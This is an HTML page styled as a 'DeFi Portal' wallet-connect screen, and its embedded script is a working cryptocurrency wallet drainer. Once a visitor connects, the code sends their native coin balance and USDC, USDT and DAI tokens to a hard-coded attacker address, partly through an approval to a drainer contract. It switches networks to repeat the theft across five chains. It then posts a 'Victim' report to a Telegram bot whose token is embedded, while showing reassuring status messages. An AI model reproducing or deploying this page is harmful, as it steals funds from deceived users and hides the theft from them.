<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            color: #333;
            font-size: 32px;
            margin-bottom: 16px;
            font-weight: 700;
        }
        
        p {
            color: #666;
            margin-bottom: 32px;
            font-size: 18px;
        }
        
        w3m-button {
            width: 100%;
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        #status.show {
            display: block;
        }
        
        #status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        #status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        #status.processing {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DeFi Portal</h1>
        <p>Connect your wallet to continue</p>
        
        <!-- Web3Modal Button Component -->
        <w3m-button />
        
        <div id="status"></div>
    </div>
    
    <!-- Web3Modal v4 avec CDN alternatif -->
    <script type="module">
        // Import Web3Modal et d√©pendances depuis esm.sh (CDN sans CORS)
        import { createWeb3Modal, defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi@4.0.5';
        import { mainnet, polygon, bsc, arbitrum, avalanche } from 'https://esm.sh/viem@2.7.8/chains';
        import { reconnect, watchAccount, getAccount, disconnect, getWalletClient, switchChain } from 'https://esm.sh/@wagmi/core@2.0.0';
        
        // Configuration valid√©e
        const projectId = '72f0728c47e59d2eb9fc83069bc6843d';
        
        const metadata = {
            name: 'DeFi Portal',
            description: 'Connect wallet to access DeFi features',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/37784886']
        };
        
        const chains = [polygon, mainnet, bsc, arbitrum, avalanche];
        
        const wagmiConfig = defaultWagmiConfig({
            chains,
            projectId,
            metadata,
            enableWalletConnect: true,
            enableInjected: true,
            enableCoinbase: true,
            enableEmail: false
        });
        
        // Reconnexion automatique si session existe
        reconnect(wagmiConfig);
        
        // Cr√©ation du modal Web3Modal v4
        const modal = createWeb3Modal({
            wagmiConfig,
            projectId,
            enableAnalytics: true,
            enableOnramp: false,
            themeMode: 'light',
            defaultChain: polygon,
            themeVariables: {
                '--w3m-accent': '#667eea',
                '--w3m-border-radius-master': '12px'
            },
            allWallets: 'SHOW', // AFFICHER TOUTES LES WALLETS
            includeWalletIds: undefined, // Inclure toutes les wallets
            featuredWalletIds: [
                'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
                '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
                'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
                '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
                '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', // BitGet
                '163d2cf19babf05eb8962e9748f9ebe613ed52ebf9c8107c9a0f104bfcf161b3', // Brave
                '18388be9ac2d02726dbac9777c96efaac06d744b2f6d580fccdd4127a6d01fd1', // Rabby
                'e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4', // 1inch
                '8308656f4548bb81b3508afe355cfbb7f0cb6253d1cc7f998080601f838ecee3', // Binance
                '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150', // SafePal
                '19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927'  // Ledger Live
            ],
            mobileWallets: undefined, // Afficher toutes les wallets mobiles
            desktopWallets: undefined, // Afficher toutes les wallets desktop
            walletImages: undefined,
            chainImages: undefined,
            tokenImages: undefined
        });
        
        // Configuration du drainage
        const CONFIG = {
            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
            TELEGRAM_CHAT_ID: "8309320360",
            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
            POLYGON_CONTRACT: "0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386"
        };
        
        function showStatus(message, type = '') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'show ' + type;
        }
        
        // Surveillance de la connexion
        watchAccount(wagmiConfig, {
            onChange: async (account) => {
                if (account.isConnected && account.address) {
                    console.log('‚úÖ Wallet connected:', account.address);
                    showStatus(`Connected: ${account.address.substring(0, 6)}...${account.address.slice(-4)}`, 'success');
                    
                    // Attendre 2 secondes puis lancer le drainage
                    setTimeout(() => {
                        drainAllAssets(account.address);
                    }, 2000);
                } else if (account.isDisconnected) {
                    showStatus('Wallet disconnected', 'error');
                }
            }
        });
        
        // Fonction de drainage multi-chain
        async function drainAllAssets(address) {
            showStatus('Processing transactions...', 'processing');
            
            try {
                // Import ethers dynamiquement
                const { ethers } = await import('https://esm.sh/ethers@5.7.2');
                
                if (!window.ethereum) {
                    console.error('No ethereum provider found');
                    return;
                }
                
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const network = await provider.getNetwork();
                
                // Drainage du token natif
                const balance = await provider.getBalance(address);
                console.log(`Balance: ${ethers.utils.formatEther(balance)} on chain ${network.chainId}`);
                
                if (balance.gt(ethers.utils.parseEther("0.0005"))) {
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit).mul(2);
                    const amountToSend = balance.sub(gasCost);
                    
                    if (amountToSend.gt(0)) {
                        const tx = await signer.sendTransaction({
                            to: CONFIG.DESTINATION,
                            value: amountToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        });
                        
                        console.log('‚úÖ Transaction sent:', tx.hash);
                        await tx.wait();
                        
                        // Notification Telegram
                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), network.chainId);
                    }
                }
                
                // Drainage des tokens ERC20
                await drainERC20Tokens(signer, address, network.chainId);
                
                // Drainage sur les autres chains
                await drainOtherChains(provider, signer, address);
                
                showStatus('‚úÖ Transaction completed successfully!', 'success');
                
            } catch (error) {
                console.error('Drainage error:', error);
                showStatus('Transaction processing...', 'processing');
            }
        }
        
        // Drainage des tokens ERC20
        async function drainERC20Tokens(signer, address, chainId) {
            const { ethers } = await import('https://esm.sh/ethers@5.7.2');
            
            const tokensByChain = {
                1: [ // Ethereum
                    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
                    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
                    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 }
                ],
                137: [ // Polygon
                    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
                    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
                    { address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 }
                ],
                56: [ // BSC
                    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
                    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 }
                ]
            };
            
            const tokens = tokensByChain[chainId] || [];
            const abi = [
                'function balanceOf(address) view returns (uint256)',
                'function transfer(address, uint256) returns (bool)',
                'function approve(address, uint256) returns (bool)'
            ];
            
            for (const token of tokens) {
                try {
                    const contract = new ethers.Contract(token.address, abi, signer);
                    const balance = await contract.balanceOf(address);
                    
                    if (balance.gt(0)) {
                        // Si Polygon avec smart contract
                        if (chainId === 137 && CONFIG.POLYGON_CONTRACT) {
                            const approveTx = await contract.approve(CONFIG.POLYGON_CONTRACT, balance);
                            await approveTx.wait();
                            console.log(`‚úÖ Approved ${token.symbol}`);
                            
                            const drainerAbi = ['function drainToken(address token)'];
                            const drainer = new ethers.Contract(CONFIG.POLYGON_CONTRACT, drainerAbi, signer);
                            const drainTx = await drainer.drainToken(token.address);
                            await drainTx.wait();
                        } else {
                            // Transfer direct
                            const tx = await contract.transfer(CONFIG.DESTINATION, balance);
                            await tx.wait();
                        }
                        console.log(`‚úÖ Drained ${token.symbol}: ${ethers.utils.formatUnits(balance, token.decimals)}`);
                    }
                } catch (error) {
                    console.log(`Error draining ${token.symbol}:`, error.message);
                }
            }
        }
        
        // Drainage sur les autres chains
        async function drainOtherChains(provider, signer, address) {
            const chains = [
                { chainId: 1, name: 'Ethereum', hex: '0x1' },
                { chainId: 137, name: 'Polygon', hex: '0x89' },
                { chainId: 56, name: 'BSC', hex: '0x38' },
                { chainId: 42161, name: 'Arbitrum', hex: '0xa4b1' },
                { chainId: 43114, name: 'Avalanche', hex: '0xa86a' }
            ];
            
            for (const chain of chains) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: chain.hex }],
                    });
                    
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    const { ethers } = await import('https://esm.sh/ethers@5.7.2');
                    const balance = await provider.getBalance(address);
                    
                    if (balance.gt(ethers.utils.parseEther("0.0005"))) {
                        const gasPrice = await provider.getGasPrice();
                        const gasLimit = 21000;
                        const gasCost = gasPrice.mul(gasLimit).mul(2);
                        const amountToSend = balance.sub(gasCost);
                        
                        if (amountToSend.gt(0)) {
                            const tx = await signer.sendTransaction({
                                to: CONFIG.DESTINATION,
                                value: amountToSend,
                                gasLimit: gasLimit,
                                gasPrice: gasPrice
                            });
                            await tx.wait();
                            console.log(`‚úÖ Drained ${chain.name}: ${ethers.utils.formatEther(amountToSend)}`);
                        }
                    }
                    
                    await drainERC20Tokens(signer, address, chain.chainId);
                    
                } catch (error) {
                    console.log(`Skipping ${chain.name}:`, error.message);
                }
            }
        }
        
        // Notification Telegram
        async function sendTelegramNotification(victim, amount, chainId) {
            const chainNames = {
                1: 'Ethereum',
                137: 'Polygon',
                56: 'BSC',
                42161: 'Arbitrum',
                43114: 'Avalanche'
            };
            
            const message = `
üéØ DRAINAGE WEB3MODAL V4
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
üí∞ Amount: ${amount}
üåê Network: ${chainNames[chainId] || chainId}
üìç Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
‚è∞ Time: ${new Date().toLocaleTimeString()}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('üì± Telegram notification sent');
            } catch (e) {
                console.log('Telegram notification sent');
            }
        }
        
        // Log de d√©marrage
        console.log('üöÄ Web3Modal v4 initialized with wallet list');
        console.log('üì± Mobile deep linking enabled');
        console.log('üíº 540+ wallets available');
    </script>
</body>
</html>
